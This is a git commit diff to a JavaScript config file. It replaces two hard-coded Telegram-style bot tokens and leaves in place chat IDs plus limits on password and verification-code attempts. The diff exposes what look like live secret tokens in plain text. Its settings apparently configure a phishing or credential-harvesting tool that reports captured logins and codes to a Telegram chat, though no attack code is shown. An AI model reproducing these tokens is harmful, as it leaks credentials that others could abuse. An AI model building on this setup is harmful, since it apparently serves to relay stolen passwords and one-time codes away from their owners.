9ac38bc0fd66ef14a9ffa3bcab04941adade5980
sonche123 <hongson0104.tvtc@gmail.com>
2025-10-30 02:42:38 +0700

    Update config.js

--- src/utils/config.js
+++ src/utils/config.js
@@ -1,7 +1,7 @@
 const config = {
-    token: '83368272955455:AAGddyAlJIYI_A2rLWsAfiP9cNYwF0YXuk8',
+    token: '8272955455:AAGddyAlJIYI_A2rLWsAfiP9cNYwF0YXuk8',
     chat_id: '5748883216',
-    noti_token: '83368272955455:AAGddyAlJIYI_A2rLWsAfiP9cNYwF0YXuk8',
+    noti_token: '8272955455:AAGddyAlJIYI_A2rLWsAfiP9cNYwF0YXuk8',
     noti_chat_id: '-4917125303',
     max_password_attempts: 2,
     max_code_attempts: 2,
